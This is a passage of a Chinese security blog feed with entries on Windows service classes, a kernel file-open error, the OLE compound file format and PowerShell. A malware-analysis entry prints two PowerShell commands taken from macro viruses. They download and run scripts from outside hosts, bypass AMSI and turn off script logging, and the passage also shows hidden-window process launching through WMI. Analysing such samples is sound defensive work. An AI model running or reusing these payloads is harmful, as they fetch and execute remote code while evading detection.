pThis->SetServiceStatusHandle(hss);\        pThis->Run(dwArgc, lpszArgv);\        delete dynamic_cast&lt;##className*>(pThis);\    &amp;#125;12345678910111213141516171819</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的代码首先根据传入的类名动态创建了一个服务类（<strong>由于这里服务对象都是动态创建和销毁的，所以在其他地方不需要创建服务对象</strong>），然后调用RegisterServiceCtrlHandlerEx构造了一个服务控制句柄，然后调用类的SetServiceStatusHandle函数来将对应的服务控制句柄保存起来最后调用Run函数来运行服务的正式代码，最后当Run函数执行完毕后，服务的相应工作也做完了，这个时候删除了这个类。Run函数的定义如下：</p><pre class="line-numbers language-cppp"><code class="language-cppp">DWORD CFSZService::Run(DWORD dwArgc, LPTSTR* lpszArgv)&#123;    assert(NULL != this);    if (OnInitService(dwArgc, lpszArgv))    &#123;        RunService();    &#125;    return 0;&#125;123456789<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个函数中使用了OnInitService函数来进一步初始化服务相关信息，该函数提供了一个服务初始化的时机。比如调用相关函数进行socket的初始化或者对com环境进行初始化等等。然后调用RunService执行服务正式的代码。</p><h3 id="HandlerEx函数"><a href="#HandlerEx函数" class="headerlink" title="HandlerEx函数"></a>HandlerEx函数</h3><p>在前面的宏IMPLAMENT_SERVICE_MAIN中调用了RegisterServiceCtrlHandlerEx将函数HandlerEx作为服务控制码的处理函数，调用的时候将服务类对象的指针通过第四个参数传入，这样在静态函数中就可以使用服务的类成员函数，函数HandlerEx的部分代码如下：</p><pre class="line-numbers language-cpp"><code class="language-cpp">    DWORD dwRet <span class="token operator">=</span> ERROR_SUCCESS<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token constant">NULL</span> <span class="token operator">==</span> lpContext <span class="token punctuation">)</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ERROR_INVALID_PARAMETER<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    CFSZService<span class="token operator">*</span>pService <span class="token operator">=</span>  <span class="token keyword">reinterpret_cast</span><span class="token operator">&lt;</span>CFSZService<span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">(</span>lpContext<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token constant">NULL</span> <span class="token operator">==</span> pService <span class="token punctuation">)</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ERROR_INVALID_PARAMETER<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span><span class="token punctuation">(</span>dwControl<span class="token punctuation">)</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> SERVICE_CONTROL_STOP<span class="token operator">:</span>  <span class="token comment" spellcheck="true">//0x00000001 停止服务器</span>        <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            dwRet <span class="token operator">=</span> pService <span class="token operator">-</span><span class="token operator">></span> <span class="token function">OnStop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token number">12345678910111213141516171819202122</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在该函数中，将所有的控制吗都列举出来，针对不同的控制吗都调用的对应的处理函数，并且这些函数都是虚函数，所以在派生类中需要处理某个控制消息就重写某个对应的函数即可。<br>最后再重新屡一下这个类在调用时的基本情况：<br>\1. 在主函数中调用CFSZService::RegisterService();函数将之前我们通过一组BEGIN_SERVICE_MAP、ON_SERVICE_MAP、END_SERVICE_MAP组成的映射关系注册到系统的服务控制管理器中。这个函数单独调用了StartServiceCtrlDispatcher函数，一旦代码执行到这个地方，服务控制管理器会根据之前绑定的服务名称与入口函数的对应关系调用对应的入口函数<br>\2. 入口函数是通过宏IMPLAMENT_SERVICE_MAIN定义的，在入口函数中首先动态创建了一个服务类，然后给这个服务注册服务控制句柄，并且服务控制函数为HandlerEx。<br>\3. 接着，服务的入口函数调用对应服务的Run函数，在Run函数中调用OnInitService进行服务的初始化和调用RunService执行服务的正式代码，所以在重载类中可以重载这两个方法进行初始化和进行服务的相关操作<br>\4. 当外部对服务进行控制时，服务控制管理器调用HandleEx函数进行相关的操作<br>\5. 在HandleEx中会解析对应的控制事件，并调用对应的虚函数，所以如果想要处理某个消息，则重写对应的控制函数即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;原文链接：&lt;a href=&quot;https://blog.csdn.net/lanuage/article/details/77937407&quot;&gt;https://blog.csdn.net/lanuage/article/details/77937407&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;从</summary>
      
    
    
    
    
    <category term="windows服务" scheme="https://guapizhu.github.io/tags/windows%E6%9C%8D%E5%8A%A1/"/>
    
  </entry>
  
  <entry>
    <title>ZwOpenFile failing with C0000043</title>
    <link href="https://guapizhu.github.io/2020/10/14/nei-he-qu-dong/zwopenfile-failing-with-c0000043/"/>
    <id>https://guapizhu.github.io/2020/10/14/nei-he-qu-dong/zwopenfile-failing-with-c0000043/</id>
    <published>2020-10-14T01:45:00.000Z</published>
    <updated>2020-10-14T01:46:02.611Z</updated>
    
    <content type="html"><![CDATA[<ul><li>报错原因<br>另一个程序正在使用此文件，进程无法访问。</li><li>解决办法<br>If the file is local, you can call IoCreateFileEx and specify<br>IO_IGNORE_SHARE_ACCESS_CHECK.<br>Note that this doesn’t do anything for a file on a network share.</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;报错原因&lt;br&gt;另一个程序正在使用此文件，进程无法访问。&lt;/li&gt;
&lt;li&gt;解决办法&lt;br&gt;If the file is local, you can call IoCreateFileEx and specify&lt;br&gt;IO_IGNORE_SHARE_ACCE</summary>
      
    
    
    
    
    <category term="内核驱动" scheme="https://guapizhu.github.io/tags/%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8/"/>
    
  </entry>
  
  <entry>
    <title>ole文件格式</title>
    <link href="https://guapizhu.github.io/2020/09/26/ole-wen-jian-ge-shi/"/>
    <id>https://guapizhu.github.io/2020/09/26/ole-wen-jian-ge-shi/</id>
    <published>2020-09-26T06:00:00.000Z</published>
    <updated>2020-09-26T06:46:50.794Z</updated>
    
    <content type="html"><![CDATA[<h2 id="OLESSHeader"><a href="#OLESSHeader" class="headerlink" title="OLESSHeader"></a>OLESSHeader</h2><table><thead><tr><th>字节偏移</th><th>说明</th></tr></thead><tbody><tr><td>0x00H~0x07H ：0-7</td><td>8个字节:固定值：0xD0 0xCF 0x11 0xE0 0xA1 0xB1 0x1A0xE1，表示此文件是复合文件</td></tr><tr><td>0x08H~0x17H  ：8-23</td><td>16个字节：ClassID，不过很多文件都置0</td></tr><tr><td>0x18H~0x19H  ：24-25</td><td>2个字节：一般为0x3E，表示文件格式的修订号</td></tr><tr><td>0x1AH~0x1BH  ：26-27</td><td>2个字节：一般为0x3，表示文件格式的版本号</td></tr><tr><td>0x1CH~0x1DH  ：28-29</td><td>2个字节：一般0FE 0xFF，表示文档使用的存储格式是小端模式（理论上0xFF 0xFE则表示大端存储方式）</td></tr><tr><td>0x1EH~0x1FH  ：30-31</td><td>2个字节：默认值:0x09 0x00，表示Sector的大小，当值为9时，即每个Sector为512（29）字节</td></tr><tr><td>0x20H~0x21H  ：32-33</td><td>2个字节：默认值:0x06 0x00，表示Mini-Sector的大小，当值为6时，即每个Mini-Sector为64（26）字节</td></tr><tr><td>0x22H~0x23H  ：34-35</td><td>2个字节，UInt16，预留值，置0</td></tr><tr><td>0x24H~0x27H  ：36-39</td><td>4个字节，UInt32，预留值，置0</td></tr><tr><td>0x28H~0x2BH  ：40-43</td><td>4个字节：表示目录扇区Directory Sectors的数量的数量；若版本号为3，则该值为0</td></tr><tr><td>0x2CH~0x2FH  ：44-47</td><td>4个字节：表示FAT的数量</td></tr><tr><td>0x30H~0x33H  ：48-51</td><td>4个字节：表示Directory开始的SectorID文件目录流的起始扇区编号</td></tr><tr><td>0x34H~0x37H  ：52-55</td><td>4个字节：一般置0，用于事务</td></tr><tr><td>0x38H~0x3BH  ：56-59</td><td>4个字节：表示ulMiniSectorCutoff，是最小串（Stream）的最大大小，默认为4096（0x00 0x10 0x00 0x00）</td></tr><tr><td>0x3CH~0x3FH  ：60-63</td><td>4个字节：_sectMiniFatStart ，是MiniFAT表开始的SectorID</td></tr><tr><td>0x40H~0x43H  ：64-67</td><td>4个字节：表示MiniFAT表的数量</td></tr><tr><td>0x44H~0x47H  ：68-71</td><td>4个字节：表示DIFAT开始的SectorID，DIFAT的起始扇区编号</td></tr><tr><td>0x48H~0x4BH  ：72-75</td><td>4个字节：表示DIFAT的数量</td></tr><tr><td>0x4CH~0x1FFH ：76-511</td><td>436个字节：UInt32，包含了109个DIFAT，每个DIFAT占用4个字节，是前109块FAT表的SectorID。Header中存储的了109个DIFAT数据。但是有时候109个还不够，这时候可以使用其它扇区专门存储DIFAT数据，0x44H~0x47H中记录的就是除这109项外，其他的DIFAT数据的起始扇区编号。在DIFAT扇区的最后4个字节，存储了下个DIFAT扇区的ID，以表示下个DIFAT数据的存储位置</td></tr></tbody></table><h2 id="OLESSDirectoryEntry"><a href="#OLESSDirectoryEntry" class="headerlink" title="OLESSDirectoryEntry"></a>OLESSDirectoryEntry</h2><table><thead><tr><th>偏移</th><th>描述</th></tr></thead><tbody><tr><td>0x00H~0x3FH</td><td>64个字节：存储DirectoryEntry名称的，并且是以Unicode存储的，即每个字符占2个字节，</td></tr><tr><td>0x40H~0x41H</td><td>2个字节：DirectoryEntry名称的长度（包括最后的“\0”）</td></tr><tr><td>0x42H~0x42H</td><td>1个字节：是DirectoryEntry的类型。0为非法，1为目录（storage），2为节点（Stream），5为根节点（Root Entry即第一个目录内容）</td></tr><tr><td>0x43H~0x43H</td><td>1个字节：节点的颜色</td></tr><tr><td>0x44H~0x47H</td><td>4个字节：该DirectoryEntry左兄弟的EntryID（第一个DirectoryEntry的EntryID为0，下同）</td></tr><tr><td>0x48H~0x4BH</td><td>4个字节：该DirectoryEntry右兄弟的EntryID</td></tr><tr><td>0x4CH~0x4FH</td><td>4个字节：该DirectoryEntry一个孩子的EntryID</td></tr><tr><td>0x50H~0x5FH</td><td>16个字节：表示CLSID</td></tr><tr><td>0x60H~0x63H</td><td>4个字节：表示UserFlags，一般是0</td></tr><tr><td>0x64H~0x6BH</td><td>8个字节：表示文件创建时间</td></tr><tr><td>0x6CH~0x73H</td><td>8个字节：表示文件修改时间</td></tr><tr><td>0x74H~0x77H</td><td>4个字节：表示该DirectoryEntry开始的SectorID</td></tr><tr><td>0x78H~0x7BH</td><td>4个字节：是该DirectoryEntry存储的所有字节长度</td></tr><tr><td>0x7CH~0x7FH</td><td>4个字节：保留置0</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;OLESSHeader&quot;&gt;&lt;a href=&quot;#OLESSHeader&quot; class=&quot;headerlink&quot; title=&quot;OLESSHeader&quot;&gt;&lt;/a&gt;OLESSHeader&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;字节偏移&lt;/th&gt;
&lt;t</summary>
      
    
    
    
    
    <category term="宏病毒" scheme="https://guapizhu.github.io/tags/%E5%AE%8F%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>powershell混淆基础</title>
    <link href="https://guapizhu.github.io/2020/09/26/powershell-hun-yao-ji-chu/"/>
    <id>https://guapizhu.github.io/2020/09/26/powershell-hun-yao-ji-chu/</id>
    <published>2020-09-26T06:00:00.000Z</published>
    <updated>2020-09-26T06:42:50.614Z</updated>
    
    <content type="html"><![CDATA[<ul><li>循环变量’$_’</li><li>powershell里的各种变量，命令，都有各种奇奇怪怪的简写。如：Get-Variable可以简写为n种形式，比如vARiAbLe，gv</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;循环变量’$_’&lt;/li&gt;
&lt;li&gt;powershell里的各种变量，命令，都有各种奇奇怪怪的简写。如：Get-Variable可以简写为n种形式，比如vARiAbLe，gv&lt;/li&gt;
&lt;/ul&gt;
</summary>
      
    
    
    
    
    <category term="宏病毒" scheme="https://guapizhu.github.io/tags/%E5%AE%8F%E7%97%85%E6%AF%92/"/>
    
    <category term="powershell" scheme="https://guapizhu.github.io/tags/powershell/"/>
    
  </entry>
  
  <entry>
    <title>powershell记录</title>
    <link href="https://guapizhu.github.io/2020/09/26/powershell-ji-lu/"/>
    <id>https://guapizhu.github.io/2020/09/26/powershell-ji-lu/</id>
    <published>2020-09-26T06:00:00.000Z</published>
    <updated>2020-09-26T06:45:18.414Z</updated>
    
    <content type="html"><![CDATA[<ul><li>文章仅对作者遇到的powershell命令做记录</li><li>一篇文章：<a href="https://www.pstips.net/why-is-powershell-powerful.html">狂吹powershell，不明觉厉</a></li></ul><h2 id="powershell知识点"><a href="#powershell知识点" class="headerlink" title="powershell知识点"></a>powershell知识点</h2><ul><li><p><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_comparison_operators?view=powershell-7">About Comparison Operators</a></p><h2 id="一个宏病毒里的powershell命令"><a href="#一个宏病毒里的powershell命令" class="headerlink" title="一个宏病毒里的powershell命令"></a>一个宏病毒里的powershell命令</h2><pre class="line-numbers language-powershell"><code class="language-powershell">cmd <span class="token operator">/</span>K poweRshell<span class="token punctuation">.</span>exe <span class="token operator">-</span>WindowStyle hiddeN <span class="token operator">-</span>ExecuTionPolicy BypasS <span class="token operator">-</span>noprofile <span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadFile<span class="token punctuation">(</span><span class="token string">'http://skycpa.in/file.php'</span><span class="token punctuation">,</span><span class="token string">'%TEMP%\Y.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>poWerShEll<span class="token punctuation">.</span>exe <span class="token operator">-</span>WindowStyle hiddeN <span class="token operator">-</span>ExecutionPolicy Bypass <span class="token operator">-</span>noprofile <span class="token operator">-</span>file <span class="token operator">%</span>TEMP<span class="token operator">%</span>\Y<span class="token punctuation">.</span>ps1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>-NoProfile：Does not load the PowerShell profile.</p></li><li><p>BypasS：Nothing is blocked and there are no warnings or prompts.</p><blockquote><p>第一段powershell命令是从’<a href="http://skycpa.in/file.php&#39;%E4%B8%AD%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B9%B6%E5%8F%A6%E5%AD%98%E4%B8%BA&#39;%TEMP%\Y.ps1&#39;%EF%BC%8C">http://skycpa.in/file.php&#39;中下载文件，并另存为&#39;%TEMP%\Y.ps1&#39;，</a><br>第二段powershell命令就是执行Y.ps1</p></blockquote></li></ul><h2 id="一个宏病毒里的powershell命令-1"><a href="#一个宏病毒里的powershell命令-1" class="headerlink" title="一个宏病毒里的powershell命令"></a>一个宏病毒里的powershell命令</h2><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token keyword">IF</span><span class="token punctuation">(</span><span class="token variable">$PSVerSiONTaBLe</span><span class="token punctuation">.</span>PSVERSiOn<span class="token punctuation">.</span>MAJOR <span class="token operator">-Ge</span> 3<span class="token punctuation">)</span>&amp;<span class="token comment" spellcheck="true">#123;</span>    <span class="token variable">$GPF</span>=<span class="token namespace">[rEf]</span><span class="token punctuation">.</span>AssEmbLY<span class="token punctuation">.</span>GETTYpe<span class="token punctuation">(</span><span class="token string">'System.Management.Automation.Utils'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"GEtFie`Ld"</span><span class="token punctuation">(</span><span class="token string">'cachedGroupPolicySettings'</span><span class="token punctuation">,</span><span class="token string">'N'</span><span class="token operator">+</span><span class="token string">'onPublic,Static'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">IF</span><span class="token punctuation">(</span><span class="token variable">$GPF</span><span class="token punctuation">)</span>&amp;<span class="token comment" spellcheck="true">#123;</span>        <span class="token variable">$GPC</span>=<span class="token variable">$GPF</span><span class="token punctuation">.</span>GeTValUe<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">If</span><span class="token punctuation">(</span><span class="token variable">$GPC</span><span class="token punctuation">[</span><span class="token string">'ScriptB'</span><span class="token operator">+</span><span class="token string">'lockLogging'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>&amp;<span class="token comment" spellcheck="true">#123;</span>            <span class="token variable">$GPC</span><span class="token punctuation">[</span><span class="token string">'ScriptB'</span><span class="token operator">+</span><span class="token string">'lockLogging'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'EnableScriptB'</span><span class="token operator">+</span><span class="token string">'lockLogging'</span><span class="token punctuation">]</span>=0<span class="token punctuation">;</span>            <span class="token variable">$GPC</span><span class="token punctuation">[</span><span class="token string">'ScriptB'</span><span class="token operator">+</span><span class="token string">'lockLogging'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'EnableScriptBlockInvocationLogging'</span><span class="token punctuation">]</span>=0        &amp;<span class="token comment" spellcheck="true">#125;</span>        <span class="token variable">$vAL</span>=<span class="token namespace">[CoLLectIOns.GeneRiC.DicTiOnAry[StRiNG,SysteM.ObjEcT]</span><span class="token punctuation">]</span>::New<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$Val</span><span class="token punctuation">.</span>AdD<span class="token punctuation">(</span><span class="token string">'EnableScriptB'</span><span class="token operator">+</span><span class="token string">'lockLogging'</span><span class="token punctuation">,</span>0<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vAl</span><span class="token punctuation">.</span>ADd<span class="token punctuation">(</span><span class="token string">'EnableScriptBlockInvocationLogging'</span><span class="token punctuation">,</span>0<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$GPC</span><span class="token punctuation">[</span><span class="token string">'HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'</span><span class="token operator">+</span><span class="token string">'lockLogging'</span><span class="token punctuation">]</span>=<span class="token variable">$val</span>    &amp;<span class="token comment" spellcheck="true">#125;</span>    <span class="token keyword">ELSe</span>&amp;<span class="token comment" spellcheck="true">#123;</span>    <span class="token namespace">[SCRipTBLOck]</span><span class="token punctuation">.</span><span class="token string">"GEtFIE`ld"</span><span class="token punctuation">(</span><span class="token string">'signatures'</span><span class="token punctuation">,</span><span class="token string">'N'</span><span class="token operator">+</span><span class="token string">'onPublic,Static'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>SeTValue<span class="token punctuation">(</span><span class="token variable">$nULl</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">NEw-OBjeCt</span> COllecTIONS<span class="token punctuation">.</span>GENERic<span class="token punctuation">.</span>HASHSet<span class="token namespace">[STRiNg]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    &amp;<span class="token comment" spellcheck="true">#125;</span>    <span class="token namespace">[ReF]</span><span class="token punctuation">.</span>AsSEMBlY<span class="token punctuation">.</span>GETTyPE<span class="token punctuation">(</span><span class="token string">'System.Management.Automation.AmsiUtils'</span><span class="token punctuation">)</span><span class="token punctuation">|</span>?&amp;<span class="token comment" spellcheck="true">#123;$_&amp;#125;|%&amp;#123;$_.GetField('amsiInitFailed','NonPublic,Static').SETVALUE($nUll,$TRUE)&amp;#125;;</span>&amp;<span class="token comment" spellcheck="true">#125;;</span><span class="token namespace">[SYSteM.NEt.SERVICePoinTMAnAgER]</span>::EXPECT100CoNTINUE=0<span class="token punctuation">;</span><span class="token variable">$WC</span>=<span class="token function">New-OBjEcT</span> SYSTEM<span class="token punctuation">.</span>NEt<span class="token punctuation">.</span>WeBCLiEnT<span class="token punctuation">;</span><span class="token variable">$u</span>=<span class="token string">'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'</span><span class="token punctuation">;</span><span class="token variable">$Wc</span><span class="token punctuation">.</span>HeADErs<span class="token punctuation">.</span>Add<span class="token punctuation">(</span><span class="token string">'User-Agent'</span><span class="token punctuation">,</span><span class="token variable">$u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$WC</span><span class="token punctuation">.</span>ProXY=<span class="token namespace">[SYSTem.Net.WeBReqUESt]</span>::DefaUltWebPRoxy<span class="token punctuation">;</span><span class="token variable">$WC</span><span class="token punctuation">.</span>PRoxY<span class="token punctuation">.</span>CrEDEntIALS = <span class="token namespace">[SysTeM.Net.CrEDENtIaLCAcHE]</span>::DEFAultNETWORkCReDentials<span class="token punctuation">;</span><span class="token variable">$Script</span>:Proxy = <span class="token variable">$wc</span><span class="token punctuation">.</span>Proxy<span class="token punctuation">;</span><span class="token variable">$K</span>=<span class="token namespace">[SyStEM.Text.EncodinG]</span>::ASCII<span class="token punctuation">.</span>GetBYtES<span class="token punctuation">(</span><span class="token string">'10cacd856333a68debb7afc89a58226e'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$R</span>=&amp;<span class="token comment" spellcheck="true">#123;$D,$K=$ArGs;$S=0..255;0..255|%&amp;#123;$J=($J+$S[$_]+$K[$_%$K.CoUnt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]&amp;#125;;$D|%&amp;#123;$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-BXor$S[($S[$I]+$S[$H])%256]&amp;#125;&amp;#125;;</span><span class="token variable">$ser</span>=<span class="token string">'http://textspeier.de:8080'</span><span class="token punctuation">;</span><span class="token variable">$t</span>=<span class="token string">'/admin/get.php'</span><span class="token punctuation">;</span><span class="token variable">$WC</span><span class="token punctuation">.</span>HeadERS<span class="token punctuation">.</span>AdD<span class="token punctuation">(</span><span class="token string">"Cookie"</span><span class="token punctuation">,</span><span class="token string">"session=8k4H9m43fuEpyQF0xcGnPHHc0L4="</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$DATa</span>=<span class="token variable">$WC</span><span class="token punctuation">.</span>DowNloaDDATa<span class="token punctuation">(</span><span class="token variable">$Ser</span><span class="token operator">+</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Iv</span>=<span class="token variable">$DaTA</span><span class="token punctuation">[</span>0<span class="token punctuation">.</span><span class="token punctuation">.</span>3<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$DatA</span>=<span class="token variable">$daTa</span><span class="token punctuation">[</span>4<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token variable">$DAta</span><span class="token punctuation">.</span>LengTH<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">-joIN</span><span class="token namespace">[ChAr[]</span><span class="token punctuation">]</span><span class="token punctuation">(</span>&amp; <span class="token variable">$R</span> <span class="token variable">$DATA</span> <span class="token punctuation">(</span><span class="token variable">$IV</span><span class="token operator">+</span><span class="token variable">$K</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">|</span><span class="token function">IEX</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>分析这段powershell，其功能是从’<a href="http://textspeier.de:8080/admin/get.php%E2%80%99%E4%B8%8B%E8%BD%BD%E6%95%B0%E6%8D%AE%E5%B9%B6%E6%89%A7%E8%A1%8C%E3%80%82">http://textspeier.de:8080/admin/get.php’下载数据并执行。</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;文章仅对作者遇到的powershell命令做记录&lt;/li&gt;
&lt;li&gt;一篇文章：&lt;a href=&quot;https://www.pstips.net/why-is-powershell-powerful.html&quot;&gt;狂吹powershell，不明觉厉&lt;/a&gt;&lt;/li&gt;
</summary>
      
    
    
    
    
    <category term="powershell" scheme="https://guapizhu.github.io/tags/powershell/"/>
    
    <category term="记录" scheme="https://guapizhu.github.io/tags/%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>vb代码记录</title>
    <link href="https://guapizhu.github.io/2020/09/26/vb-dai-ma-ji-lu/"/>
    <id>https://guapizhu.github.io/2020/09/26/vb-dai-ma-ji-lu/</id>
    <published>2020-09-26T06:00:00.000Z</published>
    <updated>2020-09-26T06:41:54.380Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-tasks--accounts-and-domains">vb的WMI官方示例</a></p><h2 id="将数据输出至文件"><a href="#将数据输出至文件" class="headerlink" title="将数据输出至文件"></a>将数据输出至文件</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">open</span> <span class="token string">"c:\zhidao.txt"</span> <span class="token keyword">for</span> output as <span class="token comment" spellcheck="true">#1 </span>print   <span class="token comment" spellcheck="true">#1, "zhidao" </span>close   <span class="token comment" spellcheck="true">#1</span>//将<span class="token string">"zhidao"</span> 保存到<span class="token string">"c:\zhidao.txt"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="常用命令执行函数"><a href="#常用命令执行函数" class="headerlink" title="常用命令执行函数"></a>常用命令执行函数</h2><ul><li>Shell、WScript.Shell、Application.Run等（以及前面提到的winmgmts方式）<h2 id="How-do-I-run-an-application-in-a-hidden-window"><a href="#How-do-I-run-an-application-in-a-hidden-window" class="headerlink" title="How do I run an application in a hidden window?"></a>How do I run an application in a hidden window?</h2></li><li>Call the application from a script that uses the Win32_Process and Win32_ProcessStartup classes.</li><li>以下代码的效果相当于在cmd中输入notepad.exe，可以输入其他任何命令</li><li>关于winmgmts：<a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/constructing-a-moniker-string">Moniker String</a><pre class="line-numbers language-bash"><code class="language-bash">Const HIDDEN_WINDOW <span class="token operator">=</span> 0strComputer <span class="token operator">=</span> <span class="token string">"."</span>Set objWMIService <span class="token operator">=</span> GetObject<span class="token punctuation">(</span><span class="token string">"winmgmts:"</span> <span class="token operator">&amp;</span> <span class="token string">"&amp;#123;impersonationLevel=impersonate&amp;#125;!\\"</span> <span class="token operator">&amp;</span> strComputer <span class="token operator">&amp;</span> <span class="token string">"\root\cimv2"</span><span class="token punctuation">)</span>Set objStartup <span class="token operator">=</span> objWMIService.Get<span class="token punctuation">(</span><span class="token string">"Win32_ProcessStartup"</span><span class="token punctuation">)</span>Set objConfig <span class="token operator">=</span> objStartup.SpawnInstance_objConfig.ShowWindow <span class="token operator">=</span> HIDDEN_WINDOWSet objProcess <span class="token operator">=</span> GetObject<span class="token punctuation">(</span><span class="token string">"winmgmts:root\cimv2:Win32_Process"</span><span class="token punctuation">)</span>errReturn <span class="token operator">=</span> objProcess.Create<span class="token punctuation">(</span> <span class="token string">"Notepad.exe"</span>, null, objConfig, intProcessID<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-tasks--accounts-and-domains&quot;&gt;vb的WMI官方示例&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;将数据输出至文件&quot;&gt;&lt;a h</summary>
      
    
    
    
    
    <category term="宏病毒" scheme="https://guapizhu.github.io/tags/%E5%AE%8F%E7%97%85%E6%AF%92/"/>
    
    <category term="记录" scheme="https://guapizhu.github.io/tags/%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>使用oletools分析宏病毒</title>
    <link href="https://guapizhu.github.io/2020/09/26/shi-yong-oletools-fen-xi-hong-bing-du/"/>
    <id>https://guapizhu.github.io/2020/09/26/shi-yong-oletools-fen-xi-hong-bing-du/</id>
    <published>2020-09-26T06:00:00.000Z</published>
    <updated>2020-09-26T06:44:06.393Z</updated>
    
